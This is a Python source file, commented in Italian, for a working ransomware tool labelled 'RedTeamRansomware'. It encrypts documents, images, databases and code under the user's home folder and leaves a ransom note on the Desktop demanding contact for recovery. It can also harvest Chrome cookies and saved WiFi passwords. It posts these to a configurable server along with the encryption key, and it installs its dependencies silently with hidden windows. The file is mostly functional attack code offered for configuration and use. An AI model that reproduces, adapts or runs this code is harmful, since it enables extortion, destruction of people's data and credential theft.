import os
import sys
import subprocess
import importlib.util
from pathlib import Path
import urllib.request
import tempfile
import argparse

# ========== CONFIGURAZIONE GLOBALE ==========
# ⚠️ MODIFICA QUESTE VARIABILI PER CONFIGURARE IL RANSOMWARE ⚠️

SERVER_URL = "http://localhost:8573"  # URL del server dashboard

# Estensioni file da cifrare
TARGET_EXTENSIONS = [
    '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', 
    '.jpg', '.png', '.zip', '.rar', '.7z', '.mp4', '.mp3', '.wav',
    '.ppt', '.pptx', '.sql', '.db', '.mdb', '.accdb', '.ino', '.cpp', '.py'
]

# Cartelle da escludere dalla cifratura
EXCLUDED_DIRS = [
    'Windows', 'Program Files', 'Programmi', 'Programmi (x86)',
    'System32', 'syswow64', 'boot', 'recovery'
]

# Comportamento del ransomware
ENCRYPT_USER_PROFILE = True    # Cifra la cartella user
COLLECT_COOKIES = False        # Raccoglie cookie browser
COLLECT_WIFI = False           # Raccoglie password WiFi
CREATE_RANSOM_NOTE = True      # Crea nota di riscatto
# Mettere True se si vuole
# ========== FINE CONFIGURAZIONE ==========

class RedTeamRansomware:
    def __init__(self, mode="encrypt", decryption_key=None):
        import json
        import sqlite3
        import requests
        from cryptography.fernet import Fernet
        import shutil
        import base64
        import uuid
        self.server_url = SERVER_URL
        self.mode = mode
        self.key = None
        self.cipher = None
        self.target_id = None
        
        self.target_extensions = TARGET_EXTENSIONS
        self.excluded_dirs = EXCLUDED_DIRS

        # Inizializza in base alla modalità
        if mode == "encrypt":
            self.key = Fernet.generate_key()
            self.cipher = Fernet(self.key)
            self.target_id = str(uuid.uuid4())
        elif mode == "decrypt" and decryption_key:
            try:
                self.key = base64.b64decode(decryption_key)
                self.cipher = Fernet(self.key)
            except Exception as e:
                print(f"❌ Invalid decryption key")
                sys.exit(1)

    def encrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as file:
                file_data = file.read()
            
            encrypted_data = self.cipher.encrypt(file_data)
            
            with open(file_path, 'wb') as file:
                file.write(encrypted_data)
            
            new_name = file_path + '.encrypted'
            os.rename(file_path, new_name)
            return True
        except Exception:
            return False

    def decrypt_file(self, file_path):
        try:
            if not file_path.endswith('.encrypted'):
                return False
            
            with open(file_path, 'rb') as file:
                encrypted_data = file.read()
            
            decrypted_data = self.cipher.decrypt(encrypted_data)
            original_path = file_path[:-10]
            
            with open(original_path, 'wb') as file:
                file.write(decrypted_data)
            
            os.remove(file_path)
            return True
            
        except Exception:
            return False

    def find_encrypted_files(self, start_path="."):
        encrypted_files = []
        for root, dirs, files in os.walk(start_path):
            for file in files:
                if file.endswith('.encrypted'):
                    file_path = os.path.join(root, file)
                    encrypted_files.append(file_path)
        return encrypted_files

    def encrypt_files(self, start_path=None):
        if start_path is None:
            start_path = os.path.expanduser("~")
        
        encrypted_files = []
        for root, dirs, files in os.walk(start_path):
            dirs[:] = [d for d in dirs if d not in self.excluded_dirs]
            for file in files:
                file_path = os.path.join(root, file)
                file_ext = os.path.splitext(file_path)[1].lower()
                if file_ext in self.target_extensions:
                    if self.encrypt_file(file_path):
                        encrypted_files.append(file_path)
        return encrypted_files

    def decrypt_files(self, start_path=None):
        if start_path is None:
            start_path = os.path.expanduser("~")
        
        encrypted_files = self.find_encrypted_files(start_path)
        if not encrypted_files:
            return 0
        
        success_count = 0
        for file_path in encrypted_files:
            if self.decrypt_file(file_path):
                success_count += 1
        return success_count

    def get_chrome_cookies(self):
        cookies_data = []
        try:
            chrome_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\Cookies"
            if os.path.exists(chrome_path):
                temp_db = "temp_cookies.db"
                shutil.copy2(chrome_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 50")
                for host, name, value in cursor.fetchall():
                    cookies_data.append({'host': host, 'name': name, 'value': value})
                conn.close()
                os.remove(temp_db)
        except Exception:
            pass
        return cookies_data

    def get_wifi_passwords(self):
        wifi_data = []
        try:
            profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], 
                                             encoding='utf-8', errors='ignore')
            profile_names = []
            for line in profiles.split('\n'):
                if "All User Profile" in line:
                    profile_name = line.split(":")[1].strip()
                    profile_names.append(profile_name)
            for profile in profile_names[:10]:
                try:
                    profile_info = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                        encoding='utf-8', errors='ignore'
                    )
                    for line in profile_info.split('\n'):
                        if "Key Content" in line:
                            password = line.split(":")[1].strip()
                            wifi_data.append({'ssid': profile, 'password': password})
                except:
                    continue
        except Exception:
            pass
        return wifi_data

    def send_data_to_server(self):
        try:
            data = {
                'target_id': self.target_id,
                'encryption_key': base64.b64encode(self.key).decode('utf-8'),
                'cookies': {'chrome': self.get_chrome_cookies()},
                'wifi_passwords': self.get_wifi_passwords()
            }
            response = requests.post(f"{self.server_url}/register_target", json=data, timeout=30)
            return response.status_code == 200
        except Exception:
            return False

    def create_ransom_note(self):
        note = f"""
        ===========================================
        |           YOUR FILES ARE ENCRYPTED      |
        ===========================================
        
        All your important files have been encrypted!
        Your Target ID: {self.target_id}
        
        Contact the administrator with this Target ID
        to recover your files.
        App Session: :(
        
        Do NOT attempt to decrypt files without the key!
        ===========================================
        """
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        note_path = os.path.join(desktop_path, "READ_ME.txt")
        with open(note_path, 'w') as f:
            f.write(note)

    def run_encryption(self):
        print("Encrypting files...")
        
        if ENCRYPT_USER_PROFILE:
            encrypted_files = self.encrypt_files()
            print(f"Encrypted: {len(encrypted_files)} files")
        
        if COLLECT_COOKIES or COLLECT_WIFI:
            self.send_data_to_server()
        
        if CREATE_RANSOM_NOTE:
            self.create_ransom_note()
        
        print(f"Target ID: {self.target_id}")

    def run_decryption(self):
        print("Decrypting files...")
        decrypted_count = self.decrypt_files()
        print(f"Decrypted: {decrypted_count} files")

# Scarica tutte le librerie necessarie
def setup_windows_environment(skip_vcredist=False, verbose=False):
    """
    Configura automaticamente l'ambiente Windows installando le dipendenze mancanti.
    
    Args:
        skip_vcredist (bool): Salta l'installazione di Visual C++ Redistributable
        verbose (bool): Mostra output dettagliato durante l'installazione
    
    Returns:
        bool: True se tutte le dipendenze sono installate correttamente, False altrimenti
    """
    
    def print_status(message, status=None):
        """Stampa messaggi con formattazione uniforme"""
        if status == "success":
            print(f"✅ {message}")
        elif status == "error":
            print(f"❌ {message}")
        elif status == "warning":
            print(f"⚠️  {message}")
        elif status == "info":
            print(f"📦 {message}")
        else:
            print(f"   {message}")
    
    def check_package(package_name):
        """Verifica se un pacchetto è installato"""
        spec = importlib.util.find_spec(package_name)
        return spec is not None
    
    def install_package(package_name, pip_name=None):
        """Installa un pacchetto usando pip"""
        if pip_name is None:
            pip_name = package_name
        
        print_status(f"Installazione di {package_name}...", "info")
        
        try:
            # Comando per installare il pacchetto
            cmd = [sys.executable, "-m", "pip", "install", pip_name]
            
            # Gestione output in base alla modalità verbose
            if verbose:
                result = subprocess.run(cmd, capture_output=False, text=True)
            else:
                result = subprocess.run(
                    cmd, 
                    capture_output=True, 
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
                )
            
            if result.returncode == 0:
                print_status(f"{package_name} installato con successo", "success")
                return True
            else:
                if not verbose:
                    error_msg = result.stderr[:200] if result.stderr else "Errore sconosciuto"
                    print_status(f"Errore: {error_msg}", "error")
                return False
                
        except subprocess.CalledProcessError as e:
            print_status(f"Errore durante l'installazione: {e}", "error")
            return False
        except Exception as e:
            print_status(f"Errore imprevisto: {e}", "error")
            return False
    
    def install_vcredist_if_needed():
        """Installa Visual C++ Redistributable se necessario"""
        if skip_vcredist:
            print_status("Installazione Visual C++ Redistributable saltata", "warning")
            return True
        
        print_status("Verifica Visual C++ Redistributable...", "info")
        
        try:
            # URL per VC++ Redistributable (versione più recente)
            vcredist_url = "https://aka.ms/vs/17/release/vc_redist.x64.exe"
            temp_dir = tempfile.gettempdir()
            vcredist_path = os.path.join(temp_dir, "vc_redist.x64.exe")
            
            # Scarica il file
            print_status("Download Visual C++ Redistributable...")
            urllib.request.urlretrieve(vcredist_url, vcredist_path)
            
            if os.path.exists(vcredist_path):
                print_status("Installazione in corso (potrebbe richiedere alcuni minuti)...")
                
                # Comando di installazione silenziosa
                cmd = [vcredist_path, '/quiet', '/norestart']
                result = subprocess.run(
                    cmd, 
                    capture_output=True, 
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                # Codici di ritorno comuni:
                # 0 = Successo
                # 1638 = Già installato
                # 3010 = Riavvio richiesto (successo)
                
                if result.returncode in [0, 1638, 3010]:
                    print_status("Visual C++ Redistributable configurato", "success")
                    return True
                else:
                    print_status(f"Installazione fallita (codice: {result.returncode})", "warning")
                    return False
            else:
                print_status("Download non riuscito", "warning")
                return False
                
        except Exception as e:
            print_status(f"Errore durante l'installazione di VC++: {e}", "warning")
            return False
    
    def create_directories():
        """Crea le directory necessarie"""
        directories = ['data', 'logs', 'temp', 'config']
        for dir_name in directories:
            dir_path = Path(dir_name)
            if not dir_path.exists():
                dir_path.mkdir(parents=True, exist_ok=True)
                print_status(f"Directory creata: {dir_name}")
    
    def create_requirements_file():
        """Crea un file requirements.txt"""
        requirements = """# File generato automaticamente da setup_windows_environment()
requests>=2.28.0
cryptography>=41.0.0
"""
        
        try:
            with open('requirements.txt', 'w', encoding='utf-8') as f:
                f.write(requirements)
            print_status("File requirements.txt creato", "success")
            return True
        except Exception as e:
            print_status(f"Errore creazione requirements.txt: {e}", "warning")
            return False
    
    def test_imports():
        """Testa l'importazione dei pacchetti critici"""
        print_status("Test importazione pacchetti...", "info")
        
        test_cases = [
            ("requests", None),
            ("cryptography.fernet", "Fernet"),
        ]
        
        all_passed = True
        
        for module_name, attribute_name in test_cases:
            try:
                if attribute_name:
                    # Per importare un attributo specifico
                    exec(f"from {module_name} import {attribute_name}")
                    print_status(f"Import {module_name}.{attribute_name}: OK", "success")
                else:
                    # Per importare l'intero modulo
                    exec(f"import {module_name}")
                    print_status(f"Import {module_name}: OK", "success")
            except ImportError as e:
                print_status(f"Import {module_name}: FALLITO - {e}", "error")
                all_passed = False
            except Exception as e:
                print_status(f"Import {module_name}: ERRORE - {e}", "error")
                all_passed = False
        
        return all_passed
    
    # ===== INIZIO FUNZIONE PRINCIPALE =====
    
    print("\n" + "="*60)
    print("CONFIGURAZIONE AUTOMATICA AMBIENTE WINDOWS")
    print("="*60 + "\n")
    
    # Verifica sistema operativo
    if sys.platform != "win32":
        print_status("Questo script è ottimizzato per Windows", "warning")
        print_status(f"Sistema rilevato: {sys.platform}", "warning")
    
    # Verifica versione Python
    print_status(f"Python versione: {sys.version}", "info")
    if sys.version_info < (3, 6):
        print_status("Python 3.6 o superiore è richiesto", "error")
        return False
    
    # 1. Aggiorna pip
    print_status("\n1. Aggiornamento pip...", "info")
    try:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "--upgrade", "pip"],
            capture_output=not verbose,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
        )
        print_status("pip aggiornato", "success")
    except Exception as e:
        print_status(f"Impossibile aggiornare pip: {e}", "warning")
    
    # 2. Installa pacchetti mancanti
    print_status("\n2. Verifica e installazione pacchetti...", "info")
    
    packages_to_check = [
        ("requests", "requests"),
        ("cryptography", "cryptography"),
    ]
    
    all_installed = True
    for py_package, pip_package in packages_to_check:
        if check_package(py_package):
            print_status(f"{py_package}: già installato", "success")
        else:
            if not install_package(py_package, pip_package):
                all_installed = False
    
    # 3. Installa VC++ Redistributable se necessario
    print_status("\n3. Verifica dipendenze runtime Windows...", "info")
    if sys.platform == "win32" and not skip_vcredist:
        install_vcredist_if_needed()
    
    # 4. Crea directory e file di configurazione
    #print_status("\n4. Configurazione file system...", "info")
    #create_directories()
    #create_requirements_file()
    
    # 4. Test finale
    print_status("\n4. Test finale...", "info")
    imports_ok = test_imports()
    
    # 5. Verifica ambiente virtuale
    print_status("\n5. Verifica ambiente...", "info")
    in_venv = hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix)
    if not in_venv:
        print_status("Consiglio: usa un ambiente virtuale (venv)", "warning")
    
    # Risultato finale
    print("\n" + "="*60)
    if all_installed and imports_ok:
        print_status("CONFIGURAZIONE COMPLETATA CON SUCCESSO!", "success")
        print("\n" + "="*60)
        return True
    else:
        print_status("CONFIGURAZIONE CON PROBLEMI", "error")
        print("\nSuggerimenti:")
        print("1. Esegui come amministratore se necessario")
        print("2. Verifica la connessione internet")
        print("3. Prova: python -m pip install --user requests cryptography")
        print("4. Installa manualmente: https://aka.ms/vs/17/release/vc_redist.x64.exe")
        print("\n" + "="*60)
        return False

def main():
    # Verifica se ci sono le librerie
    # Configurazione con opzioni
    success = setup_windows_environment(
        skip_vcredist=True,  # Salta VC++ se già installato
        verbose=False         # Output meno dettagliato
    )
    if success:
        print("\n✅ Ambiente pronto per il tuo codice!")
    else:
        print("\n❌ Impossibile proseguire senza dipendenze complete")
        sys.exit(1)

    # Inizio cryptatura o decifratura
    parser = argparse.ArgumentParser(description='File Utility', add_help=False)
    parser.add_argument('-d', '--decrypt', type=str, help='Decryption key')
    
    args = parser.parse_args()
    
    # Modalità decifratura
    if args.decrypt:
        ransomware = RedTeamRansomware(mode="decrypt", decryption_key=args.decrypt)
        ransomware.run_decryption()
    # Modalità cifratura (default)
    else:
        ransomware = RedTeamRansomware(mode="encrypt")
        ransomware.run_encryption()

if __name__ == "__main__":
    main()
